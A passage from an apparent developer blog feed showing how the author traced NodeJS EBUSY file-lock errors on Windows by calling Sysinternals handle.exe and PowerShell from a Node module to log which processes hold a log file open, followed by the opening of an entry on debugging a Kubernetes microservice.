<p>Took some time download and extract all of it.</p>
<p>I then searched through the source code and found the error code in 21 different files (filtering out all the test-related code):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-rnw</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"EBUSY"</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">node</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cut</span><span class="token plain"> -d</span><span class="token string" style="color:#e3116c">":"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-v</span><span class="token plain"> </span><span class="token builtin class-name">test</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">uniq</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token number" style="color:#36acaa">21</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After reviewing some files, I landed on <code>deps/uv/docs/src/loop.rst</code> where I found some document string of the method <code>Loop::uv_loop_close</code>:</p>
<div class="language-rst codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rst codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.. c:function:: int uv_loop_close(uv_loop_t* loop)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Releases all internal loop resources. Call this function only when the loop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    has finished executing and all open handles and requests have been closed,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    or it will return UV_EBUSY. After this function returns, the user can free</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    the memory allocated for the loop.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found it ironic how the source code is so much more elaborate than the official/external NodeJS documentation.</p>
<p>Also, I learned that .rst extension is a markup language format called <a href="https://en.wikipedia.org/wiki/ReStructuredText" target="_blank" rel="noopener noreferrer"><code>reStructuredText</code> that is both human-readable and processable by Python <code>docutils</code></a>.</p>
<p>Going back to the task at hand, the method docstring was helpful in strengthening my educated guess that this issue is filesystem-related. It also provided information about the scenario when this error might occur: after a <a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/#:~:text=What%20is%20the%20Event%20Loop,the%20system%20kernel%20whenever%20possible.&amp;text=js%20so%20that%20the%20appropriate,queue%20to%20eventually%20be%20executed." target="_blank" rel="noopener noreferrer">NodeJS Event Loop</a> has terminated and all open file handles I/O finished.</p>
<p>I decided to focus on the latter detail (file handle state) as I have some familiarity with the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/handle" target="_blank" rel="noopener noreferrer">Windows SysInternals binary called <code>handle.exe</code></a>. It gives us access to information about which process has open file handlers to a specific file.</p>
<p>I need a way to fuse this Windows executable with the NodeJS code to catch the <code>EBUSY</code> event.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="using-handle-binary-in-microservice">Using Handle Binary in Microservice<a href="https://kbbgl.github.io/blog/catch-ebusy-on-nodejs#using-handle-binary-in-microservice" class="hash-link" aria-label="Direct link to Using Handle Binary in Microservice" title="Direct link to Using Handle Binary in Microservice">​</a></h2>
<p>I wrote a module called <code>checkFileHandler.js</code> which has two functions:</p>
<ul>
<li>
<p><code>executeHandle</code> will execute the <code>handle.exe</code> binary.</p>
</li>
<li>
<p><code>getCmdArguments</code> will get the command-line arguments of the processes that handle captured using PowerShell.</p>
</li>
</ul>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> exec </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'child_process'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execFile</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> handleExecutablePath </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"./handle64.exe"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">PID_REGEX</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token regex regex-delimiter" style="color:#36acaa">/</span><span class="token regex regex-source language-regex" style="color:#36acaa">pid: </span><span class="token regex regex-source language-regex group punctuation" style="color:#393A34">(</span><span class="token regex regex-source language-regex char-set class-name" style="color:#36acaa">\d</span><span class="token regex regex-source language-regex quantifier number" style="color:#36acaa">{1,5}</span><span class="token regex regex-source language-regex group punctuation" style="color:#393A34">)</span><span class="token regex regex-delimiter" style="color:#36acaa">/</span><span class="token regex regex-flags" style="color:#36acaa">mg</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-variable function" style="color:#d73a49">executeHandle</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">filename</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">exec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">handleExecutablePath</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">err</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">err </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> err</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">signal </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   logger</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token template-string string" style="color:#e3116c">No matching handles for '</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">${</span><span class="token template-string interpolation">filename</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">}</span><span class="token template-string string" style="color:#e3116c">'</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   logger</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token template-string string" style="color:#e3116c">Couldn't run handler: </span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">${</span><span class="token template-string interpolation constant" style="color:#36acaa">JSON</span><span class="token template-string interpolation punctuation" style="color:#393A34">.</span><span class="token template-string interpolation function" style="color:#d73a49">stringify</span><span class="token template-string interpolation punctuation" style="color:#393A34">(</span><span class="token template-string interpolation">err</span><span class="token template-string interpolation punctuation" style="color:#393A34">,</span><span class="token template-string interpolation"> </span><span class="token template-string interpolation keyword" style="color:#00009f">null</span><span class="token template-string interpolation punctuation" style="color:#393A34">,</span><span class="token template-string interpolation"> </span><span class="token template-string interpolation number" style="color:#36acaa">3</span><span class="token template-string interpolation punctuation" style="color:#393A34">)</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">}</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> output </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">toString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> matches </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> output</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">match</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">PID_REGEX</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">matches</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   logger</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token template-string string" style="color:#e3116c">Found </span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">${</span><span class="token template-string interpolation">matches</span><span class="token template-string interpolation punctuation" style="color:#393A34">.</span><span class="token template-string interpolation">length</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">}</span><span class="token template-string string" style="color:#e3116c"> processes</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   matches</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">forEach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">match</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> pid </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> match</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">":"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">trimLeft</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">getCmdArguments</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pid</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-variable function" style="color:#d73a49">getCmdArguments</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">pid</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> psCommand </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token template-string string" style="color:#e3116c">Get-WmiObject -Query \"SELECT CommandLine FROM Win32_Process WHERE ProcessID = </span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">${</span><span class="token template-string interpolation">pid</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">}</span><span class="token template-string string" style="color:#e3116c">\" | Select-Object -ExpandProperty CommandLine</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token function" style="color:#d73a49">exec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"powershell.exe "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> psCommand</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">" "</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">err</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">err</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">throw</span><span class="token plain"> err</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   logger</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token template-string string" style="color:#e3116c">PID </span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">${</span><span class="token template-string interpolation">pid</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">}</span><span class="token template-string string" style="color:#e3116c"> command line arguments: </span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">${</span><span class="token template-string interpolation">data</span><span class="token template-string interpolation punctuation" style="color:#393A34">.</span><span class="token template-string interpolation function" style="color:#d73a49">toString</span><span class="token template-string interpolation punctuation" style="color:#393A34">(</span><span class="token template-string interpolation punctuation" style="color:#393A34">)</span><span class="token template-string interpolation interpolation-punctuation punctuation" style="color:#393A34">}</span><span class="token template-string template-punctuation string" style="color:#e3116c">`</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic">// return data.toString();</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">module</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exports </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token literal-property property" style="color:#36acaa">executeHandle</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> executeHandle</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then loaded the module within the microservice application code (don't forget to backup the original code in a production environment!):</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> handler </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">require</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'checkFileHandler'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> logfile </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"%PROGRAMDATA%/microservice_b/mb.log"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># </span><span class="token operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">getData</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">then</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">changeDataFormat</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">then</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">storeData</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">catch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">code </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'EBUSY'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            handler</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">executeHandle</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">logfile</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            process</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So now, whenever getData function calls finish and the NodeJS Event Loop is terminated but the log file is still unaccessible, we're going to receive detailed information about which process and its commands are keeping the log file open. Since the process is now stuck, it would be best to just terminate it so that the microservice scheduler can create another clean instance of the NodeJS server.</p>
<p>I restarted the microservice for my code to be applied and patiently waited for the situation to arise again.</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Nodejs" term="Nodejs"/>
        <category label="Windows" term="Windows"/>
        <category label="Web-dev" term="Web-dev"/>
        <category label="Debugging" term="Debugging"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Debugging NodeJS Microservice with Shared Storage on Kubernetes]]></title>
        <id>https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes</id>
        <link href="https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<p><img decoding="async" loading="lazy" src="https://tilsupport.files.wordpress.com/2021/05/sort_exceeded-1.png" alt="sort-exceeded" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>One of our largest customer recently had a problem loading a list of resources from our web application. The problem was a blocker for the customer and required to identify the problem and provide a workaround, if possible. I was assigned the task as I was the SME in this area (NodeJS microservices, infrastructure such as storage, microservice messaging and configuration).</p>
